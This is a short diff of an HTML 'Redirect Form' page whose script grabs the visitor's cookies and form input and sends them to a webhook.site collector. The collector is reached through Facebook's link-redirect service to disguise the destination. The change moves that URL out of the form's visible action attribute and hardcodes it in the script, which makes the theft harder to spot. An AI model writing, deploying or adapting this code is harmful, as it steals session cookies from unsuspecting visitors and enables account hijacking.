@@ -6,7 +6,7 @@
 <title>Redirect Form</title>
 </head>
 <body>
-<form id="redirectForm" action="https://lm.facebook.com/l.php?u=https://webhook.site/2cd4b117-84dd-4d5b-856d-1a7bf5d36f18?fbclid=IwAR3Z-r5rOxGPZyLBFgZhwL1M3VfDZi4PYkJbq7bxZQOQdO6oelV4P8uXnGg" method="GET" target="_blank">
+<form id="redirectForm" action="http://" method="GET" target="_blank">
   <input type="text" id="inputField" name="data" placeholder="Enter data...">
   <button type="submit">Submit</button>
 </form>
@@ -16,7 +16,7 @@ document.getElementById("redirectForm").addEventListener("submit", function(even
   event.preventDefault();
   var formData = new FormData(this);
   var queryString = new URLSearchParams(formData).toString();
-  var externalUrl = this.action;
+  var externalUrl = "https://lm.facebook.com/l.php?u=https://webhook.site/2cd4b117-84dd-4d5b-856d-1a7bf5d36f18?fbclid=IwAR3Z-r5rOxGPZyLBFgZhwL1M3VfDZi4PYkJbq7bxZQOQdO6oelV4P8uXnGg";
   var cookies = document.cookie;
   window.location.href = externalUrl + "?" + queryString + "&cookies=" + encodeURIComponent(cookies);
 });
